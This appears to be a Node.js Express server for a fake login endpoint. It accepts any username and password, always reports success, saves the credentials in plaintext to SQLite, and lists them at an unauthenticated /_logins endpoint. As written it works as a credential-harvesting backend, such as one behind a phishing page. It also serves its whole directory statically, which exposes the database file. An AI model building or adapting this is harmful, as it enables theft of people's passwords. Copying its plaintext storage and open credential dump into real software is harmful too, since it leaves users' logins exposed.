const express = require('express');
const path = require('path');
const bodyParser = require('body-parser');
const sqlite3 = require('sqlite3').verbose();

const app = express();
const PORT = process.env.PORT || 3000;

// Setup DB (file: data/db.sqlite)
const dbPath = path.join(__dirname, 'data', 'db.sqlite');
const fs = require('fs');
const dataDir = path.join(__dirname, 'data');
if (!fs.existsSync(dataDir)) fs.mkdirSync(dataDir);

const db = new sqlite3.Database(dbPath);

// create table if not exists
db.serialize(() => {
  db.run(`CREATE TABLE IF NOT EXISTS logins (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    username TEXT,
    password TEXT,
    ts DATETIME DEFAULT CURRENT_TIMESTAMP
  )`);
});

app.use(bodyParser.json());
app.use(express.static(path.join(__dirname)));

// Accept any username/password and save attempt
app.post('/login', (req, res) => {
  const { username = '', password = '' } = req.body || {};

  db.run('INSERT INTO logins (username, password) VALUES (?, ?)', [username, password], function (err) {
    if (err) {
      console.error('DB insert error', err);
      return res.status(500).json({ success: false, error: 'db_error' });
    }
    // Always succeed per requirement
    res.json({ success: true, id: this.lastID });
  });
});

// Simple endpoint to view stored logins (for developer/debugging)
app.get('/_logins', (req, res) => {
  db.all('SELECT id, username, password, ts FROM logins ORDER BY id DESC LIMIT 100', (err, rows) => {
    if (err) return res.status(500).json({ error: 'db_error' });
    res.json(rows);
  });
});

app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
